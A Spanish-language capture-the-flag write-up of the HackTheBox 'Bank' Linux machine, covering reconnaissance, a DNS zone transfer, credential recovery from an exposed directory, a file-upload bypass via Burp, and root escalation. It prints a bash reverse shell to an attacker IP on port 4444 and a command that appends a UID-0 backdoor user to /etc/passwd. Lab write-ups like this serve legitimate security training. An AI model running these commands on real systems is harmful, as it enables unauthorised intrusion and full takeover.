---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Bank               |
| Os                     | Linux              |
| Difficulty             | Easy               |
| Points                 | 20                 |
| IP                     | 10.10.10.29        |

Esta maquina la realizare al estilo del curso Hacking to the OSCP

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Bank/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.10.29
```

![nmap 1](/assets/images/Bank/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.29 -oG allPorts
```

![nmap2](/assets/images/Bank/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p22,53,80 10.10.10.29 -oN targeted
```

![nmap3](/assets/images/Bank/nmap3.png)

Podemos ahora suponer un dominio para agregarlo en nuestro /etc/hosts y utilizar la sigiente herramienta:

Intentemos ver a donde mas se direccionan los paquetes con el dns del puerto 53 con el comando:

```s
sudo dig @10.10.10.29 bank.htb axfr
```

![Dig](/assets/images/Bank/dig.png)

Hemos encontrado ahora mas dominios, lo siguiente sera agregarlos a nuestro etc/hosts. Y para hacerlo podemos utilizar un tipo de filtrado que nos dara forma para copiar y pegar de la manera que necesitamos.

```s
sudo dig @10.10.10.29 bank.htb axfr | grep -oE '(\w+\.)?\w+\.htb' | sort -u | tr '\n' ' '
```

Para poder administrar y presentar un reporte profesional de los dominios encontrados, podemos usar una herramienta de<a href="https://github.com/michenriksen/aquatone.git"> github</a>

```s
sudo cat urls | feroxbuster --auto-tune --extract-links --random-agent --stdin --output bank.feroxbuster --threads 100 --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Lo siguiente es usar una herramienta que automatice el <a href="https://github.com/projectdiscovery/nuclei">escaneo de vulnerabilidades</a>. Y la usaremos de la siguiente manera:

```s
nuclei -list urls
```

Aunque este no sea ahorita de gran ayuda, podemos volver a uar feroxbuster sobre el dominio que sabemos que funciona bank.htb y veremos que hay un directorio http://bank.htb/balance-transfer donde se pueden ver demasiados datos que tendremos que filtrar o simplemente seleccionar el ordenamiento por tamano para rescatar alguno que no este cifrado de la siguiente forma:

```s
sudo curl --silent --location http://bank.htb/balance-transfer |grep -i '.acc' | grep -ioE '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d '>' -f1,7 | tr '">' ' ' | sort  -k2 | head

sudo curl --silent --location http://bank.htb/balance-transfer | grep -i '.acc' | grep -ioE '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d '>' -f1,7 | tr '">' ' ' | grep -iE '\b257\b'

sudo curl --silent --location http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc
```

![Chris creds](/assets/images/Bank/cris_creds.png)

Una vez tenemos las credenciales de chris, podemos entrar a su banca y desplazarnos a la opcion de support. Para mandar una imagen con burpsuite modificada de la siguiente manera:

![Burpsuite](/assets/images/Bank/burpsuite.png)

![Burp test](/assets/images/Bank/burp_test.png)

Ahora para pasarle el reverse shell, podemos usar la funcion de burpsuite para codificar en url el siguiente comando:

```s
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.29/4444 0>&1"
```

Tambien con el curl, se puede usar el --data-urlencode 'cmd=whoami'

Una alternativa fancy a netcat es<a href="https://github.com/calebstewart/pwncat.git"> pwncat</a>
Una vez instalado, usaremos:

```s
pwncat-cs 0.0.0.0:4444
#Para ver todas las sessiones
sessions
#Para rapidamente enumerar usuarios
enumerate.users
#Para regresar a la linea de comandos normal, hay que usar
CTRL+d
```

Ahora que sabemos que el /etc/passwd tiene permisos de escritura, podemos hacernos una contrasena con:

```s
openssl passwd -1 P@ssw0rd!
```

Ahora solo hay que integrarlo al archivo /etc/passwd y ordenar que se abra una shell con los privilegios de root.

```s
echo 'rebick:$1$iTUnj8lw$nWNyVo.xJGZ.A6s40rohC1:0:0:gotcha:/root:/bin/bash' >> /etc/passwd
```
Usamos el comando su rebick y habremos ganado el usuario root.

![root](/assets/images/Bank/root.png)

![powned](/assets/images/Bank/pwned.png)